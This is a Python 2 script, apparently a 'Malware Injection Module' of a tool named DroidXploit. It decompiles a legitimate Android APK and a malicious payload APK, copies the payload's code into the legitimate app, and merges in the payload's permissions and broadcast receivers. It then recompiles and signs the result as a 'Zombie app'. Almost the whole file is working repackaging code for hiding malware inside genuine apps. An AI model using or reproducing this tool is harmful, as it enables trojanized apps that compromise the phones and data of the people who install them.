#!/usr/bin/python

import os, glob, signal, sys, shutil
import subprocess
sys.path.append("/home/deepal/android/workspace/DroidXploit")           #append directory to path so that this can be run in terminal
sys.path.append("/home/deepal/git/droidXploit/DroidXploit")
from resources.resources import bcolors                                 #this package is used to display text in colors

subprocess.call("clear")                                                #clear terminal screen at the loading time
print "[+] Malware Injection Module Loaded"

def displayAPKs(dirPath):                                               #display .apk files inside dirPath folder
    i = 1
    for item in glob.glob(dirPath+"/*.apk"):                             #check for files with .apk extension
        print "\t%s. %s" % (str(i), item.replace(dirPath+"/",""))       
        i += 1
    print ""


def decompile(freshAPK, malAPK):
    freshAPKDec = "../temp/freshAPKDec"
    malAPKDec = "../temp/malAPKDec"
    
    if os.path.isdir(freshAPKDec):
        os.system("rm -r %s"%freshAPKDec)
        print "[!] Existing %s folder in temp directory deleted!"%freshAPKDec           #remove any previously created folder with same name
    
    if os.path.isdir(malAPKDec):
        os.system("rm -r %s"%malAPKDec)
        print "[!] Existing %s folder in temp directory deleted!"%malAPKDec             #remove any previously created folder with same name
    
    print "[!] Decompiling the original app..."
    cmd = "../tools/apktool d "+freshAPK+" "+freshAPKDec
    os.system(cmd)                                                                      #decompile fresh apk file
    print "[+] %s app decompiled into %s folder"%(freshAPK, freshAPKDec)
    print "[!] Decompiling malware..."
    cmd = "../tools/apktool d "+malAPK+" "+malAPKDec
    os.system(cmd)                                                                      #decompile malicious apk file
    print "[+] %s malware app decompiled into %s folder"%(malAPK, malAPKDec)
    
    return [freshAPKDec, malAPKDec]
    

def injectMalware(freshAPK, malAPK):
    [freshAPKDec, malAPKDec] = decompile(freshAPK, malAPK)                     # decompile fresh .apk file and malicious .apk files into temp folder
    injectFiles(freshAPKDec, malAPKDec)
    updateManifest(freshAPKDec+"/AndroidManifest.xml", malAPKDec+"/AndroidManifest.xml")  
    
    return freshAPKDec

def injectFiles(freshAPKDec, malAPKDec):
    print "[!] Injecting files into original app..."
    
    for item in os.listdir(malAPKDec+"/smali/com/"):
        if(os.path.isdir(malAPKDec+"/smali/com/"+item)):
            shutil.copytree(malAPKDec+"/smali/com/"+item, freshAPKDec+"/smali/com/"+item)
    
    print "[+] All files injected into original app!"

def updateManifest(freshManifest, malManifest):
    
    print "[!] Injecting Permissions..."   
    freshMan = open(freshManifest, "r")
    malMan = open(malManifest, "r")
    freshLines = freshMan.readlines()
    malLines = malMan.readlines()
    fcount = len(freshLines)
    
    activityIndex = []
    
    for i, fLine in enumerate(freshLines):
        if "<application" in fLine:                                         #identify where to inject permissions. before <application tag
            appStart = i;
        
    for mLine in malLines:
        if "<uses-permission" in mLine:  
            freshLines.append("0")                                          #add new list item to extend the list
            for j in range(fcount-1, appStart-1,-1):
                freshLines[j+1] = freshLines[j]
            freshLines[appStart] = mLine
            appStart += 1
            fcount+=1
    
    print "[+] Permissions injected!"
    fcount = len(freshLines)
    
    #print freshLines
    
    print "[!] Injecting receiver and services..."
    
    receiverStart = 0
    receiverEnd = 0
    
    for i, fLine in enumerate(freshLines):
        if "<activity" in fLine:
            activityIndex.append(i)
            
    #print activityIndex
    
    for k, mLine in enumerate(malLines):
        receiverExists = False       
        #print mLine
        if "<receiver" in mLine:
            receiverStart = k
        if "</receiver>" in mLine:
            receiverEnd = k
            receiverExists = True
                
        if receiverExists:
            for lineNo in range(receiverEnd, receiverStart-1, -1):
                #print "++++++++++++++++++"+malLines[lineNo]
                freshLines.append("0")
                for j in range(fcount-1, activityIndex[0]-1,-1):
                    freshLines[j+1] = freshLines[j]
                freshLines[activityIndex[0]] = malLines[lineNo]
                fcount += 1
        
    print "[+] Receiver injected !"    

    freshMan.close()                        #close reading stream before opening file for writing
    
    freshMan = open(freshManifest, "w")     #open fresh manifest file for writing(inject permissions)
    for line in freshLines:
        freshMan.write(line)
    
    print "[!] Permissions injected into fresh AndroidManifest.xml. Closing manifests.."
    
    malMan.close() 
    
    #os.system("subl "+freshManifest)
    print "[+] Done!"

def recompile(decDir):
    print "[!] Recompiling decompiled app in %s..."%decDir
    os.chdir("../tools")
    print os.getcwd()
    subprocess.call(["./apktool","b","-f",decDir,decDir.replace("Dec","_recom.apk")])
    print "[+] Zombie app("+decDir.replace("Dec","_recom.apk")+") created in the temp folder !"
    os.chdir("../injector")
    return decDir.replace("Dec","_recom.apk")

def signApp(compiledApp):
    print "[!] Signing the compiled app..."
    os.chdir("../tools")
    os.system("java -jar ../tools/signapk.jar testkey.x509.pem testkey.pk8 %s %s"%(compiledApp, compiledApp.replace(".apk","_signed.apk")))
    print "[+] Zombie app signed ! Saved as "+ compiledApp.replace(".apk","_signed.apk")
    os.chdir("../injector")

def cleanTemp():
    option = (raw_input("\nDo you want to clean up temp directory ? (y/n) : ")).lower()
    if option == 'y':
        os.system("rm -R ../temp/*")
        print "[+] temp files cleaned up!"


def checkDirExists(dirPath):
    if os.path.isdir(dirPath):
        print "[!] %s directory already exists! Skipping folder creation.."%os.path.abspath(dirPath)
        return True
    else:
        print "[!] Creating %s directory..."%os.path.abspath(dirPath)
        os.mkdir(dirPath)
        return False

def openTempDir():
    option = raw_input("Do you want to open temp folder ? (y/n) : ")
    if option.lower() == "y":
        if os.path.isdir("../temp"):
            os.system("nautilus ../temp")
            

def main():
    print "\nAvailable fresh apks to infect:-"
    displayAPKs("../apks")
    freshAPK = "../apks/" +(raw_input("Fresh APK file name to infect : ")).replace(" ", "\ ")              # select fresh input file to infect
    
    print "\nAvailable apk payloads to inject:-"
    displayAPKs("../app-payloads")
    payloadAPK = "../app-payloads/" + (raw_input("Payload APK file to inject : ")).replace(" ", "\ ")
    
    if checkDirExists("../temp"):                   #check whether temperory folder exists, otherwise create it. this folder includes decompiled apks
        cleanTemp()        
    
    zombieAppDir = injectMalware(freshAPK, payloadAPK)
    
    zombieAppName = recompile(zombieAppDir)
    
    signApp(zombieAppName)
    openTempDir()
    print "[+] Module script completed!"
    print "All Done!"
    
if __name__ == "__main__":
    main()